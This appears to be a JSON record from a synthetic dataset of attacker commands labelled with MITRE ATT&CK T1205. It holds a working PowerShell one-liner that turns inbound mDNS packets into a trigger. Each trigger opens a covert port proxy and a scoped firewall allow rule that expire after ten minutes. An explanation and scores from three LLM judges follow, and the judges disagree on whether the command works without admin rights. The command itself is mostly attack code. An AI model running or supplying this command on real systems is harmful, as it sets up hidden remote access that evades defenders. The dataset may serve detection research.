{
  "technique_id": "T1205",
  "platform": "Windows",
  "shell": "PowerShell",
  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\\b(ALLOW|DROP)\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3}).*\\s5353\\b') { $src=$matches[2]; $name=\"mdns-proxy-$($src.Replace('.','-'))\"; try { netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=443 connectaddress=10.0.0.5 | Out-Null } catch {} if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8443 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; netsh interface portproxy delete v4tov4 listenport=8443 listenaddress=0.0.0.0 | Out-Null; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
  "explanation": "Uses mDNS (UDP/5353) traffic as a trigger to expose a covert TLS proxy on 8443 (portproxy to 10.0.0.5:443) for the signaling IP only.",
  "rationale_steps": [
    "Enable firewall logging",
    "Detect inbound mDNS packets",
    "Create a portproxy and matching scoped firewall allow rule",
    "Schedule automatic teardown"
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1205-419c2bb8-cf368335",
  "source_prompt_hash": "419c2bb8",
  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Well-formed PowerShell with balanced braces/quotes, valid parameters, and parseable pipelines/scriptblocks.",
        "semantic_score": 3,
        "semantic_justification": "It implements mDNS-triggered signaling to stand up a scoped 8443\u2192443 portproxy with timed teardown, but it requires administrative rights and local WinRM remoting despite 'Privilege: None', reducing operational plausibility.",
        "combined_score": 4.0,
        "confidence": 0.84,
        "timestamp": "2025-10-01T17:32:33.923880Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "All PowerShell cmdlets, `netsh` commands, parameters, and flow control structures are perfectly well-formed and parseable with balanced syntax.",
        "semantic_score": 1,
        "semantic_justification": "The command fundamentally fails to achieve its claimed intent as almost all critical operations (firewall logging, adding port proxies, and firewall rules) require administrative privileges, which directly contradicts the stated 'Privilege: None'.",
        "combined_score": 3.0,
        "confidence": 0.9,
        "timestamp": "2025-10-01T17:33:05.736421Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, braces, and parentheses, proper PowerShell syntax throughout, and correct use of cmdlets, parameters, and pipeline operations.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by monitoring mDNS traffic (UDP/5353) as a trigger to dynamically establish a covert communication channel (port proxy) that's temporary (self-destructs after 600 seconds) and restricted to the specific IP that sent the signal.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:22:25.838517Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.0,
    "llm_average_score": 4.0,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}